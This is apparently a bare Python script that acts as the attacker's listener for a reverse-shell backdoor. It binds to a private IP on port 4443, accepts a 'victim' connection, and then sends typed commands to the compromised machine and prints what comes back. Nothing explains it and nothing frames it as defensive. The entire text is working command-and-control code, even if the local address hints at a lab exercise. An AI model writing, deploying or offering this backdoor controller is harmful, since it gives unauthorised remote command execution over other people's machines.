import socket

attackerIP = '10.0.2.15'
attackerPort = 4443

server = socket.socket()
server.bind((attackerIP, attackerPort))
print("[+]Server Started !")
print("[+]Listening for victim's connections!")
server.listen(1)

victim, victimAddress = server.accept()
print(f"[+]{victimAddress} opened the backdoor!")

while True:
    cmd = input("Enter Command:")
    cmd = cmd.encode()
    victim.send(cmd)
    print("[+] command sent to the target!")
    output = victim.recv(1024)
    output = output.decode()
    print(f"[+]Command output:\n{output}")

